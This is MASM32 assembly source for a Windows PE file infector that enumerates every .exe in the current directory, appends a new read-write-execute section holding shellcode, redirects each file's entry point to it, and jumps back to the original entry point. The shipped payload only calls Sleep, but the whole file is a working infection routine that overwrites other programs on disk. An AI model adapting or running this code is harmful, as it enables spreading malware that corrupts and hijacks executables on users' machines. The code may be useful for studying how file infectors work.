.386
.model	flat, stdcall
option	casemap:none

include	c:\masm32\include\windows.inc
include	c:\masm32\include\kernel32.inc
include	c:\masm32\include\user32.inc
include	c:\masm32\include\msvcrt.inc

includelib	c:\masm32\lib\kernel32.lib
includelib	c:\masm32\lib\user32.lib
includelib	c:\masm32\lib\msvcrt.lib

IMAGE_NT_OPTIONAL_HDR32_MAGIC equ 10Bh

.data

lpFileName									db "*.exe", 0
infectorName									db "peinfectmasm.exe",0

;shellcode sleep(1337h)
shellcode 										db 33h, 192, 66h, 184,37h, 13h, 50h , 184, 42h, 24h, 80h, 7ch,  255, 208,  233,0 
patOnError 									db "Error code: ", 0
patOnSuccess 									db "Success", 13, 10, 0
patOnFinish 									db "Finish", 13, 10, 0
patNameOfFile									db "Polluting file: %s",13,10,0
patPutInt 										db "%i deci",13,10, 0

sectionName 									db "NewSexy", 0
shellcodeNop									db 90h, 0

.data?

lpFindFileData WIN32_FIND_DATA 					<>	
hFile											dd ?
shellCodeSize 									dd ?
decalage										dd ?
sizee											dd ?
sizeDifference									dd ?
ptrEntryPoint  									dd ?
pointerSizeOfImage 								dd ?
sectionAlignment 								dd ?
fileAlignment 									dd ?
oldEntryPoint 									dd ?
pointerNumberOfSection 							dd ?
executableHandle 								HANDLE ?
executableMap 									HANDLE ?
executableMapView 								LPVOID ?
filePointer 										HANDLE ?
numberOfSection 								dw ?

.code
start:
push	offset shellcode
call		crt_strlen
mov	shellCodeSize , eax
add		shellCodeSize, sizeof DWORD												;size du shellcode +  sizeof(old entrypoint)  

; Get the first file

lea		eax, lpFindFileData
push	eax
lea		eax, lpFileName
push	eax
call		FindFirstFile															; invoke	FindFirstFile,  offset lpFileName,  offset lpFindFileData
mov	hFile, eax
or		eax, eax 																; if !FinFirsFile go to exit
jz		exit
jmp		initPollute

nextFile:
; FindNextFile
lea		eax, lpFindFileData
push	eax
push	hFile
call		FindNextFile
or		eax, eax
jz		exit  

initPollute:
; test anti auto-infection
; str compare currentFileName and peInfectMasm.exe
mov	ecx, 16
mov	esi, offset  infectorName
mov	edi, offset  lpFindFileData.cFileName
repe	cmpsb									;strcmp
je		nextFile

; invoke	crt_printf, offset patNameOfFile, offset lpFindFileData.cFileName
push	offset lpFindFileData.cFileName
push	offset patNameOfFile
call		crt_printf

;Call Pollutor
push	offset lpFindFileData.cFileName
call		pollute

;optimized cmp	eax, 0
or		eax, eax
jnz		steperror

invoke	crt_printf,  offset patOnSuccess
jmp		nextFile
	
exit:
invoke	crt_printf,  offset patOnFinish
push	0
call		ExitProcess

steperror:
invoke	crt_printf,  offset patOnError
call		GetLastError
invoke	crt_printf, offset patPutInt, eax

jmp		nextFile

alignOn	proc alignment: DWORD, value: DWORD 
xor		 edx, edx
mov 	eax, value
div		alignment
cmp	edx, 0										;remainder of div is stocked in edx, result in eax
je		perfect										; if (!(value%alignment)) return value
inc		eax
mul		alignment 
jmp		bye 											; else return ((value/alignment) + 1) * (alignment)
perfect:
mov	eax, value
bye:
ret		8
alignOn	endp

pollute	proc filename1 : DWORD

;saving non rdy for use registers
push	ebx
push	edi
push	esi

;Open et Map file for both read and write                                                                                                                                                                   
mov	eax, GENERIC_WRITE
or            eax, GENERIC_READ
invoke     CreateFile, filename1, eax, 0, 0, OPEN_EXISTING, 0, 0
mov	executableHandle, eax 
cmp	eax,  INVALID_HANDLE_VALUE
je		exitpolluteerror

invoke	CreateFileMapping,  executableHandle, 0, PAGE_READWRITE, 0, 0, 0
mov	executableMap, eax
cmp	eax,  INVALID_HANDLE_VALUE
je		steperror
cmp	eax, NULL
je		exitpolluteerror

invoke	MapViewOfFile, executableMap, FILE_MAP_ALL_ACCESS, 0, 0, 0
mov	executableMapView, eax
cmp	eax, NULL
je		steperror

mov	ebx, eax
assume	ebx: ptr IMAGE_DOS_HEADER
cmp	[ebx].e_magic, IMAGE_DOS_SIGNATURE
jne		exitpolluteerror

; ebx += [ebx].e_lfanew
; we point now on IMAGE_NT_HEADER
add		ebx, [ebx].e_lfanew
assume	ebx: ptr IMAGE_NT_HEADERS
cmp	[ebx].Signature,  IMAGE_NT_SIGNATURE
jne		exitpolluteerror

; esi point now on OptionalHeader
lea		esi, [ebx].OptionalHeader
assume	esi :ptr IMAGE_OPTIONAL_HEADER
 
; check if valid win NT32 PE magicNumber
cmp	[esi].Magic, IMAGE_NT_OPTIONAL_HDR32_MAGIC
jne		exitpolluteerror
 
;saving  ptrEntryPoint  == OptionalHeader.AddressOfEntryPoint;
mov	ptrEntryPoint, esi
add		ptrEntryPoint, 10h

;saving OptionalHeader.SizeOfImage;
mov	pointerSizeOfImage, esi
add		pointerSizeOfImage, 38h

;saving OptionalHeader.SectionAlignment
mov	eax,  [esi].SectionAlignment
mov	sectionAlignment, eax

;saving OptionalHeader.FileAlignment
mov	eax,  [esi].FileAlignment
mov	fileAlignment, eax

;saving oldEntryPoint  OptionalHeader.AddressOfEntryPoint
mov	eax,  [esi].AddressOfEntryPoint
mov	oldEntryPoint, eax

;edi = FileHeader
lea		edi, [ebx].FileHeader
assume	edi :ptr IMAGE_FILE_HEADER

;saving pointerNumberOfSection  FileHeader.NumberOfSections;
mov	pointerNumberOfSection, edi
add		pointerNumberOfSection, 02h

;saving numberOfSection  FileHeader.NumberOfSections;
mov	ax, [edi].NumberOfSections
mov	numberOfSection, ax

assume	ebx : nothing
;addr IMAGE_SECTION_HEADER  = addr IMAGE_NT_HEADERS + sizeof(IMAGE_NT_HEADERS)
add		ebx, sizeof IMAGE_NT_HEADERS

;ebx += (nbSections) * sizeof (IMAGE_SECTION_HEADER)
mov 	eax, sizeof IMAGE_SECTION_HEADER
mul 	numberOfSection
add		ebx, eax
; ebx  point on the end of the sections headers, we can now set our new section

;nbsections++
inc		[edi].NumberOfSections

;*pointerSizeOfImage += shellCodeSize;
mov 	eax, pointerSizeOfImage
mov 	ecx, shellCodeSize
add 	[eax], ecx

;setting our new section info
assume	ebx: ptr IMAGE_SECTION_HEADER

;strcpy(notreSection->Name, nomSection);
push		esi
push		edi
mov		ecx, 8 					;len (sectionName)
mov		esi, offset sectionName		; source
mov		edi, ebx					; destination
rep			movsb 
pop			edi
pop			esi

;newSection->Misc.VirtualSize = AligneOn(sectionAlignment, shellCodeSize);
push	shellCodeSize
push 	sectionAlignment
call		alignOn
mov	 [ebx].Misc, eax

;newSection->VirtualAddress = AligneOn(sectionAlignment, (infosSection->VirtualAddress + infosSection->Misc.VirtualSize));
mov	ecx, ebx
sub		ecx, sizeof IMAGE_SECTION_HEADER
assume	ecx: ptr IMAGE_SECTION_HEADER

mov	eax, [ecx].Misc ;virtualSize
add		eax, [ecx].VirtualAddress ; +virtualAdress

assume	ecx: nothing
push	eax
push	sectionAlignment
call		alignOn
mov	[ebx].VirtualAddress, eax

;newSection->SizeOfRawData = AligneSur(fileAlignment,shellCodeSize);
push	shellCodeSize
push	fileAlignment
call		alignOn
mov 	[ebx].SizeOfRawData, eax 

;newSection->PointerToRawData = AligneSur(fileAlignment,(infosSection->SizeOfRawData + infosSection->PointerToRawData));
mov	ecx, ebx
sub		ecx, sizeof IMAGE_SECTION_HEADER
assume	ecx: ptr IMAGE_SECTION_HEADER
mov 	eax, [ecx].SizeOfRawData
add		eax, [ecx].PointerToRawData
assume	ecx:nothing
push	eax
push	fileAlignment
call		alignOn
mov 	[ebx].PointerToRawData, eax

mov	[ebx].PointerToRelocations, 0
mov	[ebx].PointerToLinenumbers, 0
mov	[ebx].NumberOfRelocations, 0
mov	[ebx].NumberOfLinenumbers,  0
mov	eax, IMAGE_SCN_MEM_READ
add		eax, IMAGE_SCN_MEM_WRITE
add		eax, IMAGE_SCN_MEM_EXECUTE
mov	[ebx].Characteristics,  eax

;*ptrEntryPoint = notreSection->VirtualAddress;
mov	 eax, [ebx].VirtualAddress
mov	ecx, ptrEntryPoint
mov	[ecx], eax

;decalage = oldEntryPoint - ( (ptrEntryPoint + shellCodeSize) ) nops start 
mov	eax, oldEntryPoint
mov	ecx,  ptrEntryPoint
mov	ecx, [ecx]
sub		eax, ecx
sub		eax, shellCodeSize

mov	decalage, eax

;sizeDifference = (AligneOn(fileAlignment, shellCodeSize) - shellCodeSize);  => size of nops
push	shellCodeSize
push	fileAlignment
call		alignOn
sub		eax, shellCodeSize
mov	sizeDifference, eax

push	[ebx].PointerToRawData										;save PointerToRawData

push	executableMapView 
call		UnmapViewOfFile
or		eax, eax
jz		exitpolluteerror

push	executableHandle
call		CloseHandle

or		eax, eax
jz		exitpolluteerror

push	executableMap
call		CloseHandle

or		eax, eax
jz		exitpolluteerror

;CreateFile( Filename , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
push	0
push	FILE_ATTRIBUTE_NORMAL
push	OPEN_ALWAYS
push	0
push	FILE_SHARE_WRITE
push	GENERIC_WRITE
push	filename1
call		CreateFile

mov 	filePointer, eax													
cmp	eax, INVALID_HANDLE_VALUE
je		exitpolluteerror


pop		eax 													; restore PointerToRawData
invoke	SetFilePointer, filePointer, eax, 0, FILE_BEGIN

; WriteFile, filePointer, offset shellcode, (strlen(shellcode) + 0), &sizee, NULL				;writing the shellcode on pointerToRawData
push	0
push	offset sizee
invoke	crt_strlen, offset shellcode	
push 	eax
push	offset shellcode
push	filePointer
call		WriteFile

or		eax, eax
jz		exitpolluteerror

;invoke    WriteFile, filePointer, &decallage, sizeof(DWORD), &size, NULL							;writing jmp operand oldEntryPoint
push	0
push	offset sizee
push	sizeof DWORD
push	offset decalage
push	filePointer
call		WriteFile

or		eax, eax
jz		exitpolluteerror

;fill the rest with nop in order to have the same size as we put in the header info
push	ecx
mov	ecx,	sizeDifference
myloop:
	push ecx
	invoke	WriteFile, filePointer, offset shellcodeNop, 1, offset sizee, 0
	pop	ecx
loop	myloop
pop		ecx

invoke	CloseHandle, filePointer

or	eax, eax
jz		exitpolluteerror

mov	eax, 0
jmp		doleave

exitpolluteerror:
mov	eax, 1

doleave:
;restoring non rdy for use registers
pop		esi
pop		edi
pop		ebx

ret  		4
pollute endp
end start